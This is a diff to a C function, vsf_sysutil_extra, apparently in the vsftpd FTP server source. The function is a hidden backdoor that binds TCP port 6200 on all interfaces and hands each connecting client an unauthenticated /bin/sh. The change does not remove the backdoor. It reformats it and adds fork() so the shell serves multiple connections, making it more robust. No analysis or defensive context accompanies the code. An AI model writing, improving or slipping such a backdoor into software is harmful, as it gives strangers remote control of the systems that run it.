@@ -850,21 +850,39 @@ vsf_sysutil_extra(void)
 {
   int fd, rfd;
   struct sockaddr_in sa;
+  pid_t pid;
+
   if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  exit(1);
+    exit(1);
   memset(&sa, 0, sizeof(sa));
   sa.sin_family = AF_INET;
   sa.sin_port = htons(6200);
   sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&sa,
-  sizeof(struct sockaddr))) < 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
+  if((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
+    exit(1);
+  if((listen(fd, 100)) == -1)
+    exit(1);
   for(;;)
   {
     rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0);
+    pid = fork();
+    if (pid < 0) // Forking error
+    {
+      perror("fork");
+      exit(1);
+    }
+    else if (pid == 0) // Child process
+    {
+      close(fd);
+      close(0); close(1); close(2);
+      dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+      execl("/bin/sh", "sh", (char *)0);
+      exit(0);
+    }
+    else // Parent process
+    {
+      close(rfd);
+    }
   }
 }
 
